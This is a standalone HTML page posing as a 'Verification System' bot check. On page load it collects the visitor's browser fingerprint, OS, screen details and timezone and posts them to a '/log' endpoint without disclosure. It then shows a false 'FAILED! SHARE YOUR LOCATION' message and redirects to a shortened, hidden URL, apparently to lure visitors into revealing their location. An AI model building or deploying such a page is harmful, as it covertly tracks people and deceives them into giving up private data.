<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <title>Verification System</title>

  <!-- ClientJS -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ClientJS/0.2.1/client.min.js"></script>

  <style>
    body {
      margin: 0;
      background: #0b0f19;
      color: white;
      font-family: Arial, sans-serif;

      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .box {
      text-align: center;
      width: 90%;
      max-width: 400px;
    }

    h1 {
      font-size: 22px;
      font-weight: 800;
    }

    .status {
      margin-top: 12px;
      color: #aaa;
      font-size: 14px;
    }
  </style>
</head>

<body>

<div class="box">
  <h1>🔐 VERIFYING...</h1>
  <div class="status" id="status">Starting...</div>
</div>

<script>
function setStatus(msg) {
  document.getElementById("status").innerText = msg;
}

async function start() {
  try {
    setStatus("Initializing ClientJS...");

    const client = new ClientJS();

    setStatus("Collecting device data...");

    const payload = {
      fingerprint: client.getFingerprint(),
      browser: client.getBrowser(),
      os: client.getOS(),
      screen: client.getScreenPrint(),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    setStatus("Sending to server...");

    const res = await fetch("/log", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });

    await res.json();

    // SUCCESS MESSAGE
    setStatus("Verification successful ✔");

    // REDIRECT COUNTDOWN
    let count = 5;

    const timer = setInterval(() => {
      setStatus("FAILED! \n SHARE YOUR LOCATION TO VERIFY YOU ARE NOT ROBOT. \nRedirecting... " + count);
      count--;

      if (count === 0) {
        clearInterval(timer);

        window.location.href =
          "https://urlto.me/2wTJ1";
      }
    }, 1000);

  } catch (err) {
    setStatus("Error: " + err.message);
  }
}

window.onload = start;
</script>

</body>
</html>
